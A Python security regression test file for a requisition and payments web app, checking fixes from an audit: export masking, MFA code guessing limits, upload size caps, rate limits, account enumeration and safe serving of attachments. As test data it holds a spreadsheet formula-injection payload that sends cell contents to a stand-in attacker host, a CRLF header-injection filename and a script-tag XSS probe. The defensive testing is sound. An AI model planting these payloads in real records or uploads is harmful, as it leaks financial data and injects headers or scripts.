"""
The medium and low findings from the 30 Sep 2026 security audit: the ones
that don't open a door on their own but make the next attack easy.

  * M1  the screen masked a bank number; the xlsx of the same request didn't;
  * M2  a vendor named =HYPERLINK(...) became a live formula in Finance's
        spreadsheet;
  * M3  after a right password, the 6-digit code could be guessed forever;
  * M5  no request had a size limit;
  * M7  the paid account-name lookup had no rate limit;
  * L6  sign-in said "disabled" before checking the password, revealing
        which addresses have accounts;
  * L8  an uploaded HTML file was served back as HTML;
  * L9  new recovery codes needed no current code.

Each check names the failure it prevents. Run: python test_hardening.py
"""
from __future__ import annotations

import copy
import io
import os
import tempfile
from pathlib import Path

_TMP = tempfile.mkdtemp(prefix="docex-harden-")
os.environ["DOCEX_ORG"] = "acme"
os.environ["DOCEX_ATTACHMENTS_DIR"] = str(Path(_TMP) / "att")
os.environ.pop("SUPABASE_URL", None)

import store  # noqa: E402

store.set_store(store.JsonFileStore(_TMP))

import auth as A  # noqa: E402

A._SECRET_FILE = Path(_TMP) / ".s"
A._secret_cache = None

import org_config  # noqa: E402
import requisitions as rq  # noqa: E402

PW = "correct-horse-battery"
_passed = _failed = 0


def check(label: str, cond: bool, detail: str = "") -> None:
    global _passed, _failed
    if cond:
        _passed += 1
        print(f"  ok   {label}")
    else:
        _failed += 1
        print(f"  FAIL {label}{(' — ' + detail) if detail else ''}")


PROFILE = {
    "org_id": "acme", "currency": "NGN",
    "departments": [{"key": "program", "name": "Programmes"}, {"key": "finance", "name": "Finance"}],
    "workflow": {"max_amount": 10_000_000, "steps": [
        {"key": "budget", "label": "Budget holder", "requester_department": True},
        {"key": "finance", "label": "Finance review", "department": "finance"}]},
}
USERS = [("amina@acme.org", "Amina", "program", "reviewer"),
         ("bola@acme.org", "Bola", "program", "viewer"),
         ("femi@acme.org", "Femi", "finance", "approver"),
         ("gone@acme.org", "Gone", "program", "viewer")]


def _client():
    from fastapi.testclient import TestClient
    import api.main as m
    c = TestClient(m.app, raise_server_exceptions=False)

    def h(email: str) -> dict:
        r = c.post("/auth/login", json={"email": email, "password": PW})
        return {"Authorization": "Bearer " + r.json()["token"]}
    return c, h


def test_exports_mask_like_the_screen(c, h) -> None:
    print("\nM1/M2: the spreadsheet shows what the screen shows, and runs nothing")
    from openpyxl import load_workbook
    r = rq.create_requisition("acme", submitted_by="amina@acme.org", department="program",
                              vendor_name='=HYPERLINK("http://evil.example/?"&B2,"Click")',
                              vendor_account="1111222233", amount=50_000)
    res = c.get(f"/requisitions/{r.id}/export.xlsx", headers=h("bola@acme.org"))
    check("a colleague in the same department can download it", res.status_code == 200, str(res.status_code))
    wb = load_workbook(io.BytesIO(res.content))
    cells = [cell for ws in wb.worksheets for row in ws.iter_rows() for cell in row]
    text = " ".join(str(c_.value) for c_ in cells if c_.value is not None)
    check("…but the full account number isn't in it", "1111222233" not in text)
    check("…the masked one is", "2233" in text)
    res = c.get(f"/requisitions/{r.id}/export.xlsx", headers=h("femi@acme.org"))
    wb = load_workbook(io.BytesIO(res.content))
    formulas = [c_.coordinate for ws in wb.worksheets for row in ws.iter_rows() for c_ in row
                if c_.data_type == "f"]
    check("the vendor's '=HYPERLINK' arrives as text, not a formula", formulas == [], str(formulas))
    check("…and Finance still sees the full number to pay it", "1111222233" in " ".join(
        str(c_.value) for ws in wb.worksheets for row in ws.iter_rows() for c_ in row if c_.value))
    from sheet_safety import csv_text
    check("CSV text is neutralised", csv_text("=1+1") == "'=1+1" and csv_text("@SUM(A1)") == "'@SUM(A1)")
    check("…but a negative amount reaches QuickBooks untouched", csv_text("-1,000.00") == "-1,000.00")


def test_mfa_codes_cannot_be_guessed_forever(c, h) -> None:
    print("\nM3: the 6-digit code has its own limit, which a right password doesn't reset")
    import mfa
    u = A.get_by_email("femi@acme.org", "acme")
    setup = mfa.begin_enrolment(u.id, u.email, "acme")
    mfa.confirm_enrolment(u.id, mfa.current_code(setup["secret"]), "acme")
    statuses = [c.post("/auth/login", json={"email": u.email, "password": PW, "mfa_code": "000000"}).status_code
                for _ in range(5)]
    check("five wrong codes are refused", statuses == [401] * 5, str(statuses))
    good = mfa.current_code(setup["secret"])
    r = c.post("/auth/login", json={"email": u.email, "password": PW, "mfa_code": good})
    check("after that, even the right code waits", r.status_code == 429, f"{r.status_code} {r.text[:100]}")
    A.clear_mfa_failures(u.email, "acme")
    r = c.post("/auth/login", json={"email": u.email, "password": PW, "mfa_code": good})
    check("once the wait is over, the right code works", r.status_code == 200, f"{r.status_code} {r.text[:120]}")
    tok = {"Authorization": "Bearer " + r.json().get("token", "")}
    r = c.post("/auth/mfa/recovery-codes", headers=tok)
    check("L9: new recovery codes need a current code", r.status_code == 422, str(r.status_code))
    r = c.post("/auth/mfa/recovery-codes", headers=tok, json={"code": "123456"})
    check("…and a wrong one is refused", r.status_code == 400, str(r.status_code))
    mfa.disable(u.id, "acme", actor="test")


def test_requests_have_a_size_limit(c, h) -> None:
    print("\nM5: one oversized upload can't take the server down")
    os.environ["DOCEX_MAX_UPLOAD_MB"] = "1"
    try:
        big = b"x" * (2 * 1024 * 1024)
        r = c.post("/requisitions/nothing/attachments", headers=h("amina@acme.org"),
                   files={"file": ("big.pdf", big, "application/pdf")})
        check("a 2 MB upload is refused at the door when the limit is 1 MB", r.status_code == 413,
              f"{r.status_code} {r.text[:100]}")
        check("…with a message a person can act on", "too large" in r.text.lower())

        def chunks():   # a real multipart upload, streamed with no length
            yield (b"--XB\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.pdf\"\r\n"
                   b"Content-Type: application/pdf\r\n\r\n")
            for _ in range(4):
                yield b"y" * (512 * 1024)
            yield b"\r\n--XB--\r\n"
        r = c.post("/requisitions/nothing/attachments",
                   headers={**h("amina@acme.org"), "Content-Type": "multipart/form-data; boundary=XB"},
                   content=chunks())
        check("…including a chunked upload that never says how big it is", r.status_code == 413,
              f"{r.status_code} {r.text[:100]}")
    finally:
        os.environ.pop("DOCEX_MAX_UPLOAD_MB", None)
    r = c.get("/auth/me", headers=h("amina@acme.org"))
    check("ordinary requests are unaffected", r.status_code == 200, str(r.status_code))


def test_paid_lookups_are_rate_limited(c, h) -> None:
    print("\nM7: the paid account-name lookup can't be scripted")
    import payee_verification as pv
    org_config.set_features("acme", payee_account_check=True)
    real = pv.check_account
    pv.check_account = lambda *a, **k: {"status": "ok"}
    os.environ["DOCEX_PAYEE_CHECKS_PER_HOUR"] = "3"
    try:
        body = {"name": "A", "account_number": "0123456789", "bank": "058"}
        codes = [c.post("/payee-check/account", headers=h("amina@acme.org"), json=body).status_code
                 for _ in range(4)]
        check("three go through, the fourth waits", codes == [200, 200, 200, 429], str(codes))
        r = c.post("/payee-check/account", headers=h("bola@acme.org"), json=body)
        check("…and the limit is per person, not the whole office", r.status_code == 200, str(r.status_code))
    finally:
        pv.check_account = real
        os.environ.pop("DOCEX_PAYEE_CHECKS_PER_HOUR", None)


def test_sign_in_doesnt_reveal_disabled_accounts(c, h) -> None:
    print("\nL6: a wrong password gets the same answer whether or not the account is disabled")
    u = A.get_by_email("gone@acme.org", "acme")
    A.set_active(u.id, False, org_id="acme")
    r = c.post("/auth/login", json={"email": "gone@acme.org", "password": "wrong-password-123"})
    check("wrong password: the ordinary refusal", "disabled" not in r.text.lower(), r.text[:100])
    r = c.post("/auth/login", json={"email": "gone@acme.org", "password": PW})
    check("right password: told the account is disabled", "disabled" in r.text.lower(), r.text[:100])


def test_uploaded_html_is_never_served_as_html(c, h) -> None:
    print("\nL8: an attachment comes back as a download, not a web page")
    org_config.set_features("acme", requisition_attachments=True)
    r = rq.create_requisition("acme", submitted_by="amina@acme.org", department="program",
                              vendor_name="Kano Printers", amount=10_000, submit=False)
    res = c.post(f"/requisitions/{r.id}/attachments", headers=h("amina@acme.org"),
                 files={"file": ('quote"\r\nX-Evil: 1.html', b"<script>alert(1)</script>", "text/html")})
    check("uploaded", res.status_code == 200, f"{res.status_code} {res.text[:160]}")
    att_id = (res.json().get("attachments") or [{}])[-1].get("id") if res.status_code == 200 else ""
    if not att_id and res.status_code == 200:
        att_id = res.json().get("id", "")
    res = c.get(f"/requisitions/{r.id}/attachments/{att_id}", headers=h("amina@acme.org"))
    check("served as a plain download, not text/html",
          res.headers.get("content-type", "").startswith("application/octet-stream"),
          res.headers.get("content-type", ""))
    check("the filename can't inject a header", "x-evil" not in {k.lower() for k in res.headers.keys()}
          and "\n" not in res.headers.get("content-disposition", ""), str(dict(res.headers))[:200])
    check("…and the browser is told not to guess", res.headers.get("x-content-type-options") == "nosniff")


if __name__ == "__main__":
    print("Hardening")
    org_config.apply_profile(copy.deepcopy(PROFILE))
    org_config.set_features("acme", requisition_export=True)
    for email, name, dept, role in USERS:
        A.create_user(email, name, PW, dept, role, org_id="acme")
    c, h = _client()
    test_exports_mask_like_the_screen(c, h)
    test_mfa_codes_cannot_be_guessed_forever(c, h)
    test_requests_have_a_size_limit(c, h)
    test_paid_lookups_are_rate_limited(c, h)
    test_sign_in_doesnt_reveal_disabled_accounts(c, h)
    test_uploaded_html_is_never_served_as_html(c, h)
    print(f"\n{_passed} passed, {_failed} failed")
    raise SystemExit(1 if _failed else 0)
